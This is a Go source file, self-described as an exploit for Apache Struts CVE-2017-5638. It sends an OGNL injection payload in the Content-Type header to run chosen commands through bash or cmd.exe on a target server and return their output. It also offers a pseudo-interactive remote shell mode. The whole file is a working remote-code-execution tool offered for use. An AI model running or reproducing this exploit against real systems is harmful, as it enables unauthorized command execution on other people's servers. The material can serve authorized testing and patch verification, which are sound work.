package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

// Exploit for Apache Struts CVE-2017-5638

var payload = [...]string{`%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='`, `').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`}

var urlPtr = flag.String("u", "", "url to the vulnerable struts2 instance")
var cmdPtr = flag.String("c", "whoami", "command to execute")
var interactivePtr = flag.Bool("i", false, "pseudo-interactive shell")

func main() {
	flag.Parse()

	if *interactivePtr {
		shell(*urlPtr)
	}

	cmdOutput, err := exploit(*urlPtr, *cmdPtr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
	}

	fmt.Print(cmdOutput)
}

func exploit(url, cmd string) (string, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}

	payloadStr := payload[0] + cmd + payload[1]
	req.Header.Set("Content-Type", payloadStr)
	req.Header.Set("Accept", "*/**")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil && err != io.ErrUnexpectedEOF {
		return "", nil
	}

	return string(bodyBytes), nil
}

func shell(url string) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("$ ")
		text, err := reader.ReadString('\n')
		if err != nil {
			panic(err)
		}

		cmdOutput, err := exploit(url, strings.TrimRight(text, "\r\n"))
		if err != nil {
			fmt.Fprintf(os.Stderr, "%v\n", err)
			os.Exit(1)
		}

		fmt.Print(cmdOutput)
	}
}
